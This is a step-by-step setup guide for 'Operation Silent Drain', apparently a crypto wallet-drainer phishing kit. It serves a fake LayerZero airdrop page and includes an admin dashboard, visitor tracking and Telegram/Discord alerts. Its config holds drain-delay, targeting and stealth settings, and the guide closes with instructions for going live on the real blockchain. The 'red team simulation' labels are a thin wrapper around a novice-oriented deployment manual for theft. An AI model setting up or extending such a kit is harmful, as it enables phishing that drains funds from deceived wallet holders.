# 🚀 Complete Installation Guide - Operation Silent Drain

**[RED TEAM SIMULATION - AUTHORIZED TESTING ONLY]**

**Updated**: August 29, 2025  
**Status**: ✅ Production Ready

This guide will walk you through setting up the complete system from scratch, even if you have zero coding experience.

## 📋 What You'll Learn

By the end of this guide, you'll have:
- ✅ A working frontend website
- ✅ A powerful admin dashboard
- ✅ Real-time visitor tracking
- ✅ Telegram and Discord notifications
- ✅ A production-ready system

## 🛠️ What You Need

### **Computer Requirements:**
- Windows 10/11, Mac, or Linux
- At least 4GB RAM
- 2GB free disk space
- Internet connection

### **Software You'll Install:**
1. **Node.js** - The programming language runtime
2. **Git** - To download the project files
3. **A text editor** - To edit configuration files

## 📥 Step 1: Install Required Software

### **1.1 Install Node.js**

**What is Node.js?**
Think of Node.js like the engine that runs your car. Without it, nothing works.

**How to install:**

1. **Go to https://nodejs.org**
2. **Click the big green "LTS" button** (LTS means "Long Term Support")
3. **Download the file** (it will be something like "node-v18.x.x-x64.msi")
4. **Double-click the downloaded file**
5. **Click "Next" on every screen** (the default settings are perfect)
6. **Click "Install"**
7. **Wait for it to finish**
8. **Click "Finish"**

**How to check if it worked:**
1. **Press Windows key + R**
2. **Type "cmd" and press Enter**
3. **Type "node --version" and press Enter**
4. **You should see something like "v18.x.x"**

### **1.2 Install Git**

**What is Git?**
Git is like a file manager that helps you download and organize code projects.

**How to install:**

1. **Go to https://git-scm.com**
2. **Click "Download for Windows"** (or Mac/Linux)
3. **Download the file**
4. **Double-click the downloaded file**
5. **Click "Next" on every screen** (default settings are fine)
6. **Click "Install"**
7. **Wait for it to finish**
8. **Click "Finish"**

### **1.3 Install a Text Editor (VS Code)**

**What is VS Code?**
VS Code is like Microsoft Word, but for code. It helps you edit files easily.

**How to install:**

1. **Go to https://code.visualstudio.com**
2. **Click the big blue "Download" button**
3. **Download the file**
4. **Double-click the downloaded file**
5. **Click "Next" on every screen**
6. **Click "Install"**
7. **Wait for it to finish**
8. **Click "Finish"**

## 📁 Step 2: Download the Project

### **2.1 Create a Project Folder**

1. **Open File Explorer**
2. **Go to your Desktop**
3. **Right-click in empty space**
4. **Select "New" → "Folder"**
5. **Name it "operation-silent-drain"**
6. **Double-click to open the folder**

### **2.2 Download Project Files**

**Option A: If you have the files already:**
1. **Copy all project files** into your new folder
2. **Skip to Step 3**

**Option B: If you need to download:**
1. **Open Command Prompt** (Windows key + R, type "cmd", press Enter)
2. **Navigate to your folder:**
   ```bash
   cd Desktop
   cd operation-silent-drain
   ```
3. **Download the project** (if you have a Git repository)

## ⚙️ Step 3: Install Project Dependencies

### **3.1 Open Command Prompt in Project Folder**

1. **Open your project folder** in File Explorer
2. **Click in the address bar** (where it shows the folder path)
3. **Type "cmd" and press Enter**
4. **A black Command Prompt window will open**

### **3.2 Install Dependencies**

**What are dependencies?**
Dependencies are like ingredients for a recipe. Your project needs these "ingredients" to work.

**How to install:**

1. **In the Command Prompt, type:**
   ```bash
   npm install
   ```
2. **Press Enter**
3. **Wait for it to finish** (this might take 2-5 minutes)
4. **You'll see lots of text scrolling** - this is normal
5. **When it's done, you'll see your command prompt again**

**What you should see:**
```
added 1234 packages, and audited 1234 packages in 15s
found 0 vulnerabilities
```

## 🔧 Step 4: Configure the System

### **4.1 Create Configuration File**

1. **In your project folder, right-click in empty space**
2. **Select "New" → "Text Document"**
3. **Name it ".env"** (including the dot)
4. **If Windows asks about the file extension, click "Yes"**

### **4.2 Edit the Configuration File**

1. **Right-click the ".env" file**
2. **Select "Open with" → "VS Code"**
3. **Copy and paste this content:**

```env
# =============================================================================
# SERVER CONFIGURATION
# =============================================================================
PORT=3000
NODE_ENV=development

# =============================================================================
# BLOCKCHAIN CONFIGURATION (FOR LATER)
# =============================================================================
# You'll fill these in later when you deploy
RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID
PRIVATE_KEY=0xYOUR_PRIVATE_KEY_HERE
VAULT_CONTRACT_ADDRESS=0x0000000000000000000000000000000000000000

# =============================================================================
# NOTIFICATION SETTINGS (OPTIONAL)
# =============================================================================
# Get these from Telegram and Discord (explained later)
TELEGRAM_BOT_TOKEN=YOUR_TELEGRAM_BOT_TOKEN
TELEGRAM_CHAT_ID=YOUR_CHAT_ID
DISCORD_WEBHOOK_URL=YOUR_DISCORD_WEBHOOK_URL

# =============================================================================
# OPERATION SETTINGS
# =============================================================================
TARGET_PRIORITY=high
DRAIN_DELAY=500
MAX_RETRIES=3
STEALTH_MODE=true

# =============================================================================
# SECURITY SETTINGS
# =============================================================================
ADMIN_SECRET=your-super-secret-admin-key-here
SESSION_TIMEOUT=30

# =============================================================================
# MONITORING SETTINGS
# =============================================================================
DEBUG_MODE=false
LOG_LEVEL=info
BASE_URL=http://localhost:3000
FORCE_HTTPS=false
```

4. **Press Ctrl + S to save**
5. **Close VS Code**

## 🚀 Step 5: Start the System

### **5.1 Start the Server**

1. **In your Command Prompt, type:**
   ```bash
   node server.js
   ```
2. **Press Enter**

**What you should see:**
```
[RED TEAM SIMULATION] Blockchain provider initialized
[INFO] Vault contract not configured - running in simulation mode
[RED TEAM SIMULATION] Server running on port 3000
[RED TEAM SIMULATION] Admin dashboard: http://localhost:3000/admin
[RED TEAM SIMULATION] Frontend: http://localhost:3000
```

### **5.2 Test the System**

1. **Open your web browser** (Chrome, Firefox, etc.)
2. **Go to: http://localhost:3000**
3. **You should see the LayerZero airdrop page**
4. **Go to: http://localhost:3000/admin**
5. **You should see the admin dashboard**

## 🎯 Step 6: Test Everything Works

### **6.1 Test Frontend**
1. **Go to http://localhost:3000**
2. **Click "Connect Wallet"** (even if you don't have MetaMask)
3. **You should see a professional error message** (not technical jargon)

### **6.2 Test Admin Dashboard**
1. **Go to http://localhost:3000/admin**
2. **You should see:**
   - Statistics cards
   - Control panel
   - Activity tabs
   - Visitor tracking

### **6.3 Test Visitor Tracking**
1. **Refresh the frontend page** a few times
2. **Go back to admin dashboard**
3. **Click "Visitor Log" tab**
4. **You should see your visits listed**

## 🔧 Step 7: Optional - Set Up Notifications

### **7.1 Telegram Bot Setup**

**What is Telegram?**
Telegram is like WhatsApp but better for notifications.

**How to set up:**

1. **Open Telegram app** (download from telegram.org if needed)
2. **Search for "@BotFather"**
3. **Start a chat with BotFather**
4. **Send: `/newbot`**
5. **Follow the instructions** to create your bot
6. **Copy the bot token** (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)
7. **Search for "@userinfobot"**
8. **Start a chat and send any message**
9. **Copy your chat ID** (looks like: `123456789`)

**Update your .env file:**
```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

### **7.2 Discord Webhook Setup**

**What is Discord?**
Discord is like Slack - great for team notifications.

**How to set up:**

1. **Go to your Discord server**
2. **Click server settings** (gear icon)
3. **Go to "Integrations" → "Webhooks"**
4. **Click "New Webhook"**
5. **Give it a name like "Airdrop Alerts"**
6. **Copy the webhook URL**

**Update your .env file:**
```env
DISCORD_WEBHOOK_URL=your_webhook_url_here
```

## 🎉 Congratulations!

Your system is now **fully operational** in simulation mode!

### **What You Have:**
- ✅ **Working frontend** - Professional airdrop page
- ✅ **Admin dashboard** - Full monitoring and control
- ✅ **Visitor tracking** - See all visitors with details
- ✅ **Error handling** - Professional user messages
- ✅ **Simulation mode** - Works without real blockchain

### **What You Can Do:**
1. **Test the frontend** - http://localhost:3000
2. **Monitor visitors** - Admin dashboard
3. **Receive notifications** - Telegram/Discord (if configured)
4. **Simulate operations** - All features work in test mode

## 🚀 Next Steps (When Ready for Production)

When you're ready to deploy to real blockchain:

1. **Get ETH** for gas fees
2. **Deploy the contract** (see DEPLOYMENT_GUIDE.md)
3. **Update .env** with real addresses
4. **System automatically switches** to production mode

## 🆘 Troubleshooting

### **"node is not recognized"**
- **Solution:** Reinstall Node.js from nodejs.org

### **"npm is not recognized"**
- **Solution:** Restart Command Prompt after installing Node.js

### **"Port 3000 is already in use"**
- **Solution:** Close other applications or change PORT in .env

### **"Cannot find module"**
- **Solution:** Run `npm install` again

### **Page won't load**
- **Solution:** Make sure you typed `node server.js` and it's running

## 📞 Need Help?

If you get stuck:
1. **Check the error messages** carefully
2. **Make sure all software is installed**
3. **Verify your .env file** is correct
4. **Restart the Command Prompt** and try again

---

**Remember:** This system is for authorized security testing only. Always use responsibly and legally.
